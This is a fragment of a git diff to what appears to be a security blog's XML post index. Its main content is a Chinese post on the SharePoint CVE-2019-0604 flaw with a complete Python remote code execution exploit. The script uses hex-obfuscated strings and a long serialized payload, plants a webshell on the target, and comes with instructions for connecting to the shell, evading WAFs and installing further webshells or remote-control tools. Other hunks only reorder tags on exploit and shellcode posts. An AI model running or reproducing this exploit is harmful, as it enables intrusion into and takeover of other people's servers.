2N0bDA1JyxldmVudCk7HgV0aXRsZQUURXh0ZXJuYWwgSXRlbSBQaWNrZXIfAwVQcmV0dXJuIG9uS2V5RG93blJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1JywgMywgZmFsc2UsIGV2ZW50KTseCnNwZWxsY2hlY2sFBWZhbHNlHg9jb250ZW50RWRpdGFibGUFBHRydWUeDWFyaWEtaGFzcG9wdXAFBHRydWUeBXN0eWxlBTp3b3JkLXdyYXA6IGJyZWFrLXdvcmQ7b3ZlcmZsb3cteDogaGlkZGVuO292ZXJmbG93LXk6IGF1dG87HgRyb2xlBQd0ZXh0Ym94ZAIBDw8WCh4IVGFiSW5kZXgBAAAfBxsAAAAAAABZQAcAAAAeBFJvd3MCAR8faB8JAoACFhIfGQWxAVN0b3JlT2xkVmFsdWUoJ2N0bDAwX1BsYWNlSG9sZGVyRGlhbG9nQm9keVNlY3Rpb25fY3RsMDUnKTsgc2F2ZU9sZEVudGl0aWVzKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7IFN5cy5VSS5Eb21FbGVtZW50LmFkZENzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8iBT1yZXR1cm4gb25LZXlVcFJ3KCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7HyQFFEV4dGVybmFsIEl0ZW0gUGlja2VyHx0FP3VwZGF0ZUNvbnRyb2xWYWx1ZSgnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScpOx8bBYEDaWYodHlwZW9mKEV4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKT09J2Z1bmN0aW9uJyl7IGlmKFNob3VsZENhbGxDdXN0b21DYWxsQmFjaygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsZXZlbnQpKXtpZighVmFsaWRhdGVQaWNrZXJDb250cm9sKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jykpe1Nob3dWYWxpZGF0aW9uRXJyb3IoKTtyZXR1cm4gZmFsc2U7fWVsc2Uge0V4dGVybmFsQ3VzdG9tQ29udHJvbENhbGxiYWNrKCdjdGwwMF9QbGFjZUhvbGRlckRpYWxvZ0JvZHlTZWN0aW9uX2N0bDA1Jyk7fX19IFN5cy5VSS5Eb21FbGVtZW50LnJlbW92ZUNzc0NsYXNzKHRoaXMsICdtcy1pbnB1dEJveEFjdGl2ZScpOx8oBSJkaXNwbGF5OiBub25lO3Bvc2l0aW9uOiBhYnNvbHV0ZTsgHwMFUHJldHVybiBvbktleURvd25SdygnY3RsMDBfUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbl9jdGwwNScsIDMsIGZhbHNlLCBldmVudCk7Hx8FATAeGnJlbmRlckFzQ29udGVudEVkaXRhYmxlRGl2BQR0cnVlZAICDw8WAh4HVmlzaWJsZWhkZBgBBR5fX0NvbnRyb2xzUmVxdWlyZVBvc3RCYWNrS2V5X18WAgU0Y3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNyRxdWVyeUJ1dHRvbgUoY3RsMDAkUGxhY2VIb2xkZXJEaWFsb2dCb2R5U2VjdGlvbiRjdGwwNVdO0+ZP+kKR1gMQud0zVHpuy8sqq7e4YSOgfg1USdFj’,<br>‘<strong>VIEWSTATEGENERATOR’:’A123E449’,<br>ct1+paySection+’$ctl07$queryTextBox’:’’,<br>paySpanData:payload1+’4700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e600640027001600d60056007700f6002700b600c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3003300130026006600330083005300630016004600330063004300560033005300d500d500c200020035009700370047005600d600e2004400160047001600e20035005600270067009600360056003700c200020065005600270037009600f600e600d3004300e2000300e2000300e2000300c200020034005700c6004700570027005600d300e60056005700470027001600c600c2000200050057002600c60096003600b400560097004500f600b6005600e600d3002600730073001600530036005300630013009300330043005600030083009300a300c300f300’+payload2+’5600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002000200c300d400560047008600f60046000500160027001600d60056004700560027003700e300d000a000020002000200020002000200c3001600e600970045009700070056000200870037009600a3004700970007005600d3002200870037004600a3003700470027009600e60076002200e3006200c6004700b300250056003700f600570027003600560044009600360047009600f600e600160027009700d000a0008700d600c600e6003700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c600f20007002700560037005600e6004700160047009600f600e6002200d000a0008700d600c600e6003700a3008700d30022008600470047000700a300f200f2003700360086005600d60016003700e200d600960036002700f6003700f60066004700e2003600f600d600f20077009600e60066008700f2002300030003006300f20087001600d600c6002200d000a0008700d600c600e6003700a30035009700370047005600d600d30022003600c6002700d200e6001600d600560037000700160036005600’+payload3+’0e200250056000700c6001600360056008200070077004600b2002200d300d300d3002200c200220022009200b300560067001600c60082003600f60046005600c20022005700e600370016006600560022009200b3000200d700b3005200e500620076004700b3000200620076004700b3000200220052003400f600d600d600f600e60005002700f600760027001600d60064009600c600560037005200c500d400960036002700f6003700f600660047000200350086001600270056004600c500750056002600020035005600270067005600270002005400870047005600e60037009600f600e6003700c50013005300c50045005400d4000500c400140045005400c500c40014009500f400550045003500c50057001600e2001600370007008700220002006200c6004700b300f20035009700370047005600d600a3003500470027009600e6007600620076004700b300d000a000900090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700e200d400560047008600f60046000500160027001600d60056004700560027003700620076004700b300d000a00090006200c6004700b300f200f4002600a600560036004700440016004700160005002700f60067009600460056002700620076004700b300d000a0006200c6004700b300f200250056003700f600570027003600560044009600360047009600f600e600160027009700620076004700b300d000a000c300f2001600e60097004500970007005600e300d000a0000200020002000200c300f200d400560047008600f60046000500160027001600d60056004700560027003700e300d000a00002000200c300f20005002700f600a6005600360047005600460005002700f600070056002700470097000300e300d000a000c300f2005400870007001600e6004600560046007500270016000700070056002700f400660085001600d600c600250056001600460056002700f4002600a600560036004700440016004700160005002700f60067009600460056002700e300’,<br>ct1+paySection+ct2+’$OriginalEntities’:’&lt;Entities /&gt;’,<br>ct1+paySection+ct2+’$HiddenEntityKey’:’’,<br>ct1+paySection+ct2+’$HiddenEntityDisplayText’:’’,<br>ct1+paySection+ct2+’$downlevelTextBox’:’&nbsp;’,<br>‘</strong>CALLBACKID’:ct1+paySection+’$ctl07’,<br>‘<strong>CALLBACKPARAM’:’;#;#11;#;#;#’,<br>‘</strong>EVENTVALIDATION’:’/wEdAArGxMN0ZJ7K9w5zktdyYEhBD0ElpjQ1qya+g3gJn5tj2kGdpzwPwReE9qIrxAfsdm2iW+aWbiEcyxsYaScsTlQ450VsGNyXdI9EVzK0gDisZ5XfOLdqAfYHRFskSc14VkFc8gJL9PF80m6F3xAWwiF2sOBSyZzTvibJdZIQ6/yiluhmzA7nAUttaM/XaeAk14GgLvO2vw2Ax/oUZshBCs1rvRIjfjnjQxx1nrwDNJpAlG8icRe2xKLDvCGTmWjcu2A=’}</p>
+<p>data = urllib.urlencode(values)<br>req = urllib2.Request(url+spver, data)<br>response = urllib2.urlopen(req)<br>the_page = response.read()<br>print exp+’\n’+payload5<br>print the_page</p>
+<p>headers = {<br>    “Accept”: “text/html,application/xhtml+xml,application/xml;q=0.9,<a href="https://www.cnblogs.com/k8gege" target="_blank">image</a>/webp,image/apng,<em>/</em>;q=0.8”,<br>    “Accept-Language”: “en”,<br>    “Cache-Control”: “max-age=0”,<br>    “Connection”: “keep-alive”,<br>    “Cookie”: “PHPSESSID=m2hbrvp548cg6v4ssp0l35kcj7; _ga=GA1.2.2052701472.1532920469; _gid=GA1.2.1351314954.1532920469; __atuvc=3%7C31; __atuvs=5b5e9a0418f6420c001”,<br>    #”User-Agent”: “Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36”,<br>    “Upgrade-Insecure-Requests”: “1”,<br>    uapay: payload4,<br>    }</p>
+<p>data = {“<strong>CALLBACKID”: “”,<br>        “</strong>VIEWSTATE”: “”,<br>        ‘ctl00$’+paySection+’$’: “”,<br>        “<strong>CALLBACKID”: “All”,<br>        “</strong>CALLBACKPARAM”: “”}</p>
+<p>response = requests.get(shellurl, headers=headers, timeout=5)<br>if response.content==’UAshell’:<br>    print ‘UAshell: ‘+shellurl<br></p></pre><p></p>
+</div>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px;"><strong>实战:</strong></span></p>
+<p><span style="font-size: 16px;">python cve-2019-0604-exp.py&nbsp;http://<a href="http://k8gege.github.io" target="_blank">k8gege.github.io</a></span></p>
+<p><span style="font-size: 16px;">若成功返回WebShell地址</span></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_1.png"></p>
+<p><span style="font-size: 16px;">UAshell访问报错，大家不要慌，原本设计就是这样子</span></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_2.png"></p>
+<p><span style="font-size: 16px;">使用K8飞刀CMD连接，当然你可以通过CMD下载其它的WebShell过去管理</span></p>
+<p><span style="font-size: 16px;">比如菜刀,因为飞刀UA系列的WebShell除了过WAF，均无文件管理功能</span></p>
+<p><span style="font-size: 16px;">使用UA而不使用菜刀一句话，是因为菜刀一句话都是POST，容易被WAF拦截</span></p>
+<p><span style="font-size: 16px;">当然你传过去后发现目标无WAF或无杀软，再传其它Webshell或植入远控都可以</span></p>
+<p><img alt data-original="http://k8gege.org/k8img/posts/CVE-2019-0604_3.png"></p>
+<p>&nbsp;</p>
+<p><span style="font-size: 18px; color: #ff00ff;"><strong>下载：</strong></span></p>
+<p>&nbsp;<a href="https://github.com/k8gege/CVE-2019-0604" target="_blank">https://github.com/k8gege/CVE-2019-0604</a></p>
+<p><a href="https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py" target="_blank">&nbsp;https://github.com/k8gege/K8tools/raw/master/cve-2019-0604-exp.py</a></p>
+]]></content>
+      <categories>
+        <category>Exp</category>
+        <category>工具</category>
+      </categories>
+      <tags>
+        <tag>Exp</tag>
+        <tag>Tool</tag>
+        <tag>Code</tag>
+        <tag>GetShell</tag>
       </tags>
   </entry>
   <entry>
@@ -4199,8 +4298,8 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
       <categories>
         <category>工具</category>
         <category>免杀</category>
-        <category>Cobalt Strike</category>
         <category>Metasploit</category>
+        <category>Cobalt Strike</category>
         <category>ShellCode</category>
         <category>Python</category>
       </categories>
@@ -4228,12 +4327,12 @@ ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
 <p>&nbsp;</p>
 <p>链接: <a href="https://github.com/k8gege/K8tools" target="_blank">https://github.com/k8gege/K8tools/blob/master/k8zzz.rar</a></p>]]></content>
       <categories>
-        <category>提权</category>
         <category>Exp</category>
+        <category>提权</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>MS17010</tag>
         <tag>SMB</tag>
       </tags>
@@ -4385,164 +4484,15 @@ xxe_data = r"""&lt;!DOCTYPE Autodiscover [
 <p>Cscan: <a href="https://www.cnblogs.com/k8gege/p/10519321.html" target="_blank">https://www.cnblogs.com/k8gege/p/10519321.html</a></p>
 <p>MSF:&nbsp;&nbsp;<a href="https://github.com/k8gege/ZimbraExploit" target="_blank"> https://github.com/k8gege/ZimbraExploit</a></p>]]></content>
       <categories>
+        <category>Exp</category>
         <category>工具</category>
         <category>Ladon</category>
-        <category>Exp</category>
       </categories>
       <tags>
-        <tag>Tool</tag>
         <tag>Exp</tag>
+        <tag>Tool</tag>
         <tag>GetShell</tag>
         <tag>Zimbra</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>CVE-2019-0604 SharePoint GetShell Exploit</title>
-    <url>/p/e896a7d1.html</url>
-    <content><![CDATA[<p><span style="font-size: 18px;"><strong>漏洞信息</strong></span></p>
-<p><span style="font-size: 16px;">Microsoft SharePoint是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。</span></p>
-<p><span style="font-size: 16px;">Microsoft SharePoint 远程代码执行漏洞（CVE-2019-0594、CVE-2019-0604，高危）：Microsoft SharePoint软件无法检查应用程序包源标记时触发该漏洞。攻击者可在SharePoint应用程序池和SharePoint服务器中执行任意代码。</span></p>
-<p><span style="font-size: 18px;"><strong>影响版本：</strong></span></p>
-<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">Microsoft SharePoint Enterprise Server 2016</span></div>
-<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">SharePoint Foundation 2013 SP1</span></div>
-<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">harePoint Server 2010 SP2</span></div>
-<div class="article-content" style="margin-top: 0px;"><span style="font-size: 16px;">SharePoint Server 2019。</span></div>
-<h2 id="h2-2"><span style="font-size: 18px;">攻击入口</span></h2>
-<p><span style="font-size: 16px;">ItemPicker Web 控件实际上从来没有在一个 .aspx 页面中使用过。但是看看它基类型的用法，EntityEditorWithPicker，说明在 /_layouts/15/Picker.aspx 应该有一个 Picker.aspx 文件使用了它。</span></p>
-<p><span style="font-size: 16px;">该页面要求使用选择器对话框的类型通过 URL 的 PickerDialogType 参数的形式提供。在这里，可以使用以下两种 ItemPickerDialog 类型中的任何一种：</span></p>
-<pre><span style="font-size: 16px;"><code class="hljs css">&middot; <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.WebControls<span class="hljs-selector-class">.ItemPickerDialog <span class="hljs-selector-tag">in             <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.dll
-
-<p>&middot; <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.Portal<span class="hljs-selector-class">.WebControls<span class="hljs-selector-class">.ItemPickerDialog <span class="hljs-selector-tag">in <span class="hljs-selector-tag">Microsoft<span class="hljs-selector-class">.SharePoint<span class="hljs-selector-class">.Portal<span class="hljs-selector-class">.dll<br></span></span></span></span></span></span></span></span></span></span></p></span></span></span></span></span></span></span></span></code></span></pre><p></p>
-<p><span style="font-size: 16px;">利用第一种 <span style="font-size: 16px;">PickerDialogType </span>类型</span></p>
-<p>&nbsp;</p>
-<h2 id="h2-3">PoC</h2>
-<p><span style="font-size: 16px;">当表单提交 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的值以 &ldquo;__&rdquo; 为开头时(类似于&ldquo;_dummy&rdquo;)，</span></p>
-<p><span style="font-size: 16px;">EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 处的断点将显示以下情况：而调用另外一种 ItemPickerDialog 类型时，函数调用栈只是在最上面的两个有所不同。</span></p>
-<p><span style="font-size: 16px;">这表明 ctl00$PlaceHolderDialogBodySection$ctl05$hiddenSpanData 的数据最终出现在了 EntityInstanceIdEncoder.DecodeEntityInstanceId(string) 中。 剩下的只需要拷贝实例 ID 和构造一个 XmlSerializer 的 payload 就可以了。</span></p>
-<p>&nbsp;</p>
-<p><span style="font-size: 18px;"><strong>补充：</strong></span></p>
-<p><span style="font-size: 16px;">作者说只要构造一个XML序列化的Payload就可以了，但是Payload提交到哪里呢？</span></p>
-<p><span style="font-size: 16px;">原文中只说了一半,完整POST以及具体参数如下：</span></p>
-<p><span style="font-size: 16px;">URL： /Picker.aspx?PickerDialogType=控件的程序集限定名&nbsp; <br></span></p>
-<p><span style="font-size: 16px;">参数： <span style="font-size: 16px;">ctl00%24PlaceHolderDialogBodySection%24ctl05%24hiddenSpanData=<span style="font-size: 16px;">payload </span></span></span></p>
-<p><span style="font-size: 16px;"><span style="font-size: 16px;">实际上还需访问<span style="font-size: 16px;">Picker.aspx</span>附带的其它参数，测试我不附带其它参数时提交表单是失败的。</span></span></p>
-<p>&nbsp;</p>
-<p><span style="font-size: 16px;">此漏洞分析文章出来时就想搭环境测试了，第一天下载APP安装后发现下错了<span style="font-size: 16px;">，</span></span></p>
-<p><span style="font-size: 16px;">加上项目未遇到该程序，搭环境也浪费时间懒得弄，就暂时丢一边了。</span></p>
-<p><span style="font-size: 16px;">今天发现上周已经弄了一半，又重新研究了一下。</span></p>
-<p>&nbsp;</p>
-<p><strong><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">详情请看原文，我想以下文章应该不少人看过了吧，所谓原理很多人都能说得出来</span></strong></p>
-<p><strong><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">就是都在等一个真正能用的EXP吧，哈哈哈，我就是传说中的云黑客&ldquo;鸡你太美&rdquo;！</span></strong></p>
-<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">原文(英文): <a href="https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability" target="_blank">https://www.thezdi.com/blog/2019/3/13/cve-2019-0604-details-of-a-microsoft-sharepoint-rce-vulnerability</a></span></p>
-<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 16px;">译文(中文): <a href="https://www.anquanke.com/post/id/173476" target="_blank">https://www.anquanke.com/post/id/173476</a></span></p>
-<p>&nbsp;</p>
-<p><span class="RichText ztext CopyrightRichText-richText" style="font-size: 18px;"><strong>EXP</strong></span></p>
-<div class="cnblogs_Highlighter">
-<pre class="brush:python;gutter:true;">#cve-2019-0604 SharePoint RCE exploit
-#date: 20190618 #author: <a href="https://www.cnblogs.com/k8gege" target="_blank">k8gege</a>
-import urllib
-import urllib2
-import sys
-import requests
-url0 = sys.argv[1]
-url1 = '/_layouts/15/Picker.aspx?PickerDialogType='
-url = url0 + url1 
-shellurl=url0+'/_layouts/15/ua.aspx'
-exp='\x63\x76\x65\x2D\x32\x30\x31\x39\x2D\x30\x36\x30\x34\x20\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x20\x52\x43\x45\x20\x65\x78\x70\x6C\x6F\x69\x74'
-paySpanData='\x63\x74\x6C\x30\x30\x24\x50\x6C\x61\x63\x65\x48\x6F\x6C\x64\x65\x72\x44\x69\x61\x6C\x6F\x67\x42\x6F\x64\x79\x53\x65\x63\x74\x69\x6F\x6E\x24\x63\x74\x6C\x30\x35\x24\x68\x69\x64\x64\x65\x6E\x53\x70\x61\x6E\x44\x61\x74\x61';
-paySection='\x50\x6C\x61\x63\x65\x48\x6F\x6C\x64\x65\x72\x44\x69\x61\x6C\x6F\x67\x42\x6F\x64\x79\x53\x65\x63\x74\x69\x6F\x6E'
-ct1='\x63\x74\x6C\x30\x30\x24'
-ct2='\x24\x63\x74\x6C\x30\x35'
-spver = '\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x2E\x57\x65\x62\x43\x6F\x6E\x74\x72\x6F\x6C\x73\x2E\x49\x74\x65\x6D\x50\x69\x63\x6B\x65\x72\x44\x69\x61\x6C\x6F\x67\x2C\x4D\x69\x63\x72\x6F\x73\x6F\x66\x74\x2E\x53\x68\x61\x72\x65\x50\x6F\x69\x6E\x74\x2C\x56\x65\x72\x73\x69\x6F\x6E\x3D\x31\x35\x2E\x30\x2E\x30\x2E\x30\x2C\x43\x75\x6C\x74\x75\x72\x65\x3D\x6E\x65\x75\x74\x72\x61\x6C\x2C\x50\x75\x62\x6C\x69\x63\x4B\x65\x79\x54\x6F\x6B\x65\x6E\x3D\x37\x31\x65\x39\x62\x63\x65\x31\x31\x31\x65\x39\x34\x32\x39\x63'
-uapay='\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74'
-payload1='\x5F\x5F\x62\x70\x38\x32\x63\x31\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x32\x30\x30\x33\x35\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x65\x32\x30\x30\x39\x34\x30\x30\x65\x36\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x65\x36\x30\x30\x31\x36\x30\x30\x63\x36\x30\x30\x65\x32\x30\x30\x35\x34\x30\x30\x38\x37\x30\x30\x30\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x34\x36\x30\x30\x37\x35\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x30\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x30\x36\x30\x30\x32\x33\x30\x30\x62\x35\x30\x30\x62\x35\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x37\x35\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x66\x36\x30\x30\x37\x37\x30\x30\x33\x37\x30\x30\x65\x32\x30\x30\x64\x34\x30\x30\x31\x36\x30\x30\x32\x37\x30\x30\x62\x36\x30\x30\x35\x37\x30\x30\x30\x37\x30\x30\x65\x32\x30\x30\x38\x35\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x35\x36\x30\x30\x33\x37\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x39\x36\x30\x30\x66\x36\x30\x30\x65\x36\x30\x30\x36\x34\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x35\x36\x30\x30\x37\x37\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x62\x36\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x36\x35\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x66\x36\x30\x30\x65\x36\x30\x30\x64\x33\x30\x30\x34\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x33\x34\x30\x30\x35\x37\x30\x30\x63\x36\x30\x30\x34\x37\x30\x30\x35\x37\x30\x30\x32\x37\x30\x30\x35\x36\x30\x30\x64\x33\x30\x30\x65\x36\x30\x30\x35\x36\x30\x30\x35\x37\x30\x30\x34\x37\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x63\x36\x30\x30\x63\x32\x30\x30\x30\x32\x30\x30\x30\x35\x30\x30\x35\x37\x30\x30\x32\x36\x30\x30\x63\x36\x30\x30\x39\x36\x30\x30\x33\x36\x30\x30\x62\x34\x30\x30\x35\x36\x30\x30\x39\x37\x30\x30\x34\x35\x30\x30\x66\x36\x30\x30\x62\x36\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x64\x33\x30\x30\x33\x33\x30\x30\x31\x33\x30\x30\x32\x36\x30\x30\x36\x36\x30\x30\x33\x33\x30\x30\x38\x33\x30\x30\x35\x33\x30\x30\x36\x33\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x33\x33\x30\x30\x36\x33\x30\x30\x34\x33\x30\x30\x35\x36\x30\x30\x33\x33\x30\x30\x35\x33\x30\x30\x64\x35\x30\x30\x63\x32\x30\x30\x62\x35\x30\x30\x33\x35\x30\x30\x39\x37\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x65\x32\x30\x30\x37\x35\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x66\x36\x30\x30\x37\x37\x30\x30\x33\x37\x30\x30\x65\x32\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x32\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30'
-payload2='\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x30\x32\x30\x30\x36\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x66\x36\x30\x30\x65\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x31\x33\x30\x30\x65\x32\x30\x30\x30\x33\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x35\x36\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x66\x36\x30\x30\x34\x36\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x37\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x35\x37\x30\x30\x34\x37\x30\x30\x36\x36\x30\x30\x64\x32\x30\x30\x31\x33\x30\x30\x36\x33\x30\x30\x32\x32\x30\x30\x66\x33\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x63\x33\x30\x30\x35\x34\x30\x30\x38\x37\x30\x30\x30\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x34\x36\x30\x30\x37\x35\x30\x30\x32\x37\x30\x30\x31\x36\x30\x30\x30\x37\x30\x30\x30\x37\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x66\x34\x30\x30\x36\x36\x30\x30\x38\x35\x30\x30\x31\x36\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x32\x35\x30\x30\x35\x36\x30\x30\x31\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x66\x34\x30\x30\x32\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x34\x34\x30\x30\x31\x36\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x36\x37\x30\x30\x39\x36\x30\x30\x34\x36\x30\x30\x35\x36\x30\x30\x32\x37\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x61\x33\x30\x30\x38\x37\x30\x30\x33\x37\x30\x30\x39\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x38\x36\x30\x30\x34\x37\x30\x30\x34\x37\x30\x30\x30\x37\x30\x30\x61\x33\x30\x30\x66\x32\x30\x30\x66\x32\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x65\x32\x30\x30\x37\x37\x30\x30\x33\x33\x30\x30\x65\x32\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x37\x36\x30\x30\x66\x32\x30\x30\x32\x33\x30\x30\x30\x33\x30\x30\x30\x33\x30\x30\x31\x33\x30\x30\x66\x32\x30\x30\x38\x35\x30\x30\x64\x34\x30\x30\x63\x34\x30\x30\x33\x35\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x31\x36\x30\x30\x64\x32\x30\x30\x39\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x34\x37\x30\x30\x31\x36\x30\x30\x65\x36\x30\x30\x33\x36\x30\x30\x35\x36\x30\x30\x32\x32\x30\x30\x30\x32\x30\x30\x38\x37\x30\x30\x64\x36\x30\x30\x63\x36\x30\x30\x65\x36\x30\x30\x33\x37\x30\x30\x61\x33\x30\x30\x38\x37\x30\x30\x33\x37\x30\x30\x34\x36\x30\x30\x64\x33\x30\x30\x32\x32\x30\x30\x38\x36\x30\x30\x34\x37\x30\x30\x34\x37\x30\x30\x30\x37\x30\x30\x61\x33\x30\x30\x66\x32\x30\x30\x66\x32\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x37\x37\x30\x30\x65\x32\x30\x30\x37\x37\x30\x30\x33\x33\x30\x30\x65\x32\x30\x30\x66\x36\x30\x30\x32\x37\x30\x30\x37\x36\x30\x30\x66\x32\x30\x30\x32\x33\x30\x30\x30\x33\x30\x30\x30\x33\x30\x30\x31\x33\x30\x30\x66\x32\x30\x30\x38\x35\x30\x30\x64\x34\x30\x30\x63\x34\x30\x30\x33\x35\x30\x30\x33\x36\x30\x30\x38\x36\x30\x30\x35\x36\x30\x30\x64\x36\x30\x30\x31\x36\x30\x30\x32\x32\x30\x30\x65\x33\x30\x30\x64\x30\x30\x30\x61\x30\x30\x30\x30\x32\x30\x30\x30\x32\x30\x30\x63\x33\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\x36\x30\x30\x61\x36\x30\x30\x35\x36\x30\x30\x33\x36\x30\x30\x34\x37\x30\x30\x35\x36\x30\x30\x34\x36\x30\x30\x30\x35\x30\x30\x32\x37\x30\x30\x66\